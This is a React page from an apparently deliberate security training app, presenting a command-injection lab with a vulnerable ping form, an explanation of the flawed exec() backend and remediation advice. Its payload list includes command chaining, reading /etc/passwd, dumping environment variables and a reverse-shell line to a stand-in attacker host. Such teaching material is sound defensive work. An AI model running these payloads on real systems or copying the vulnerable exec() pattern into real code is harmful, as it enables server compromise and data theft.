import React, { useState } from 'react';
import axios from 'axios';
import './LabPage.css';

const API_BASE = process.env.REACT_APP_API_BASE || 'http://localhost:3001';

// PUBLIC_INTERFACE
/**
 * Level 9: Command Injection Lab
 * OWASP A03:2021 - Injection
 * 
 * Demonstrates OS command injection by passing unsanitized user input
 * directly to system shell commands.
 * 
 * ⚠️ EXTREME DANGER: This vulnerability allows full server compromise!
 */
function CommandInjectionLab() {
  const [host, setHost] = useState('127.0.0.1');
  const [output, setOutput] = useState('');
  const [loading, setLoading] = useState(false);

  const handlePing = async (e) => {
    e.preventDefault();
    setLoading(true);
    setOutput('');
    
    try {
      const token = sessionStorage.getItem('token');
      const result = await axios.post(
        `${API_BASE}/api/vulnerable/ping`,
        { host },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      
      setOutput(result.data.output || result.data.error || 'No output');
    } catch (err) {
      setOutput(`Error: ${err.response?.data?.message || err.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="lab-page">
      <div className="lab-header">
        <h1>🎯 Level 9: Command Injection</h1>
        <span className="lab-badge difficulty-hard">Hard</span>
        <span className="lab-badge">OWASP A03</span>
      </div>

      <div className="lab-section" style={{background: '#fee2e2', border: '2px solid #ef4444'}}>
        <h2>⚠️ EXTREME DANGER WARNING ⚠️</h2>
        <p style={{color: '#991b1b', fontWeight: 'bold'}}>
          This vulnerability is one of the MOST DANGEROUS in web security.
          Command injection allows complete server compromise, data theft, and malware installation.
          <strong> NEVER deploy code like this to any environment connected to the internet.</strong>
        </p>
        <p>
          This lab is for educational purposes ONLY and should run in an isolated, sandboxed environment.
        </p>
      </div>

      <div className="lab-section">
        <h2>📝 Objective</h2>
        <p>
          Execute additional system commands beyond ping by exploiting command injection.
          The backend passes user input directly to the shell using child_process.exec(),
          allowing command chaining with special characters.
        </p>
      </div>

      <div className="lab-section vulnerability-warning">
        <h3>⚠️ Vulnerability Details</h3>
        <ul>
          <li><strong>Type:</strong> OS Command Injection</li>
          <li><strong>Impact:</strong> Complete server compromise, data breach, ransomware</li>
          <li><strong>Root Cause:</strong> Unsanitized input passed to exec()</li>
          <li><strong>Attack Method:</strong> Command chaining with ; && || | characters</li>
          <li><strong>OWASP:</strong> A03:2021 - Injection</li>
        </ul>
      </div>

      <div className="lab-interactive">
        <h2>🏓 Network Ping Tool (Vulnerable)</h2>
        
        <form onSubmit={handlePing} className="comment-form">
          <div className="form-group">
            <label>Host to Ping:</label>
            <input
              type="text"
              value={host}
              onChange={(e) => setHost(e.target.value)}
              placeholder="127.0.0.1"
              style={{fontFamily: 'monospace'}}
            />
          </div>
          
          <button type="submit" className="btn-primary" disabled={loading}>
            {loading ? 'Pinging...' : 'Ping Host'}
          </button>
        </form>

        {output && (
          <div className="code-block" style={{marginTop: '15px'}}>
            <strong>Command Output:</strong>
            <pre style={{whiteSpace: 'pre-wrap', marginTop: '10px'}}>
              {output}
            </pre>
          </div>
        )}
      </div>

      <div className="lab-section">
        <h2>💣 Command Injection Payloads</h2>
        <div className="payload-display">
          {`# List directory contents:
127.0.0.1; ls -la

# Display current user:
127.0.0.1; whoami

# Read sensitive files:
127.0.0.1; cat /etc/passwd

# Check environment variables:
127.0.0.1; env

# Using different separators:
127.0.0.1 && whoami        # Execute if ping succeeds
127.0.0.1 || whoami        # Execute if ping fails
127.0.0.1 | whoami         # Pipe output
127.0.0.1 \`whoami\`         # Command substitution
127.0.0.1 $(whoami)        # Command substitution

# Multiple commands:
127.0.0.1; pwd; ls; whoami

# Create backdoor (DO NOT DO THIS):
127.0.0.1; nc -e /bin/bash attacker.com 4444`}
        </div>
      </div>

      <div className="lab-section">
        <h2>🔍 How It Works</h2>
        <pre className="code-block">
{`// Vulnerable backend code:
const { exec } = require('child_process');

router.post('/ping', (req, res) => {
  const { host } = req.body;
  
  // DANGEROUS: User input directly in shell command
  const command = \`ping -c 4 \${host}\`;
  
  exec(command, (error, stdout, stderr) => {
    res.json({ output: stdout + stderr });
  });
});

// When user sends: "127.0.0.1; whoami"
// The executed command becomes:
// "ping -c 4 127.0.0.1; whoami"
// 
// Shell interprets this as TWO commands:
// 1. ping -c 4 127.0.0.1
// 2. whoami
//
// Result: Both commands execute!`}
        </pre>
      </div>

      <div className="lab-section">
        <h2>🛡️ Remediation</h2>
        <pre className="code-block">
{`// Bad (Vulnerable):
const { exec } = require('child_process');
const command = \`ping -c 4 \${userInput}\`;
exec(command, ...);

// Good (Secure):
// 1. Use execFile instead of exec (doesn't invoke shell)
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', userInput], (error, stdout) => {
  // Arguments are passed separately, no shell interpretation
});

// 2. Strict input validation
const validateIP = (ip) => {
  const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
  if (!ipRegex.test(ip)) return false;
  
  // Validate each octet is 0-255
  const octets = ip.split('.');
  return octets.every(octet => {
    const num = parseInt(octet, 10);
    return num >= 0 && num <= 255;
  });
};

if (!validateIP(host)) {
  return res.status(400).json({ error: 'Invalid IP address' });
}

// 3. Use allowlists, not denylists
const allowedHosts = ['127.0.0.1', 'localhost', 'example.com'];
if (!allowedHosts.includes(host)) {
  return res.status(400).json({ error: 'Host not allowed' });
}

// 4. Never use:
// - exec() with user input
// - eval() with user input
// - system() with user input
// - shell_exec() with user input

// 5. Run with minimal privileges
// Use containers, separate user accounts, chroot jails

// 6. If you MUST use shell commands:
const escapeShellArg = (arg) => {
  return \`'\${arg.replace(/'/g, "'\\\\'')}'\`;
};
// But really, don't do this. Use execFile.`}
        </pre>
      </div>

      <div className="lab-hint">
        💡 <strong>Hint:</strong> Try using semicolons (;) or double ampersands (&&) to chain commands after the IP address!
      </div>
    </div>
  );
}

export default CommandInjectionLab;
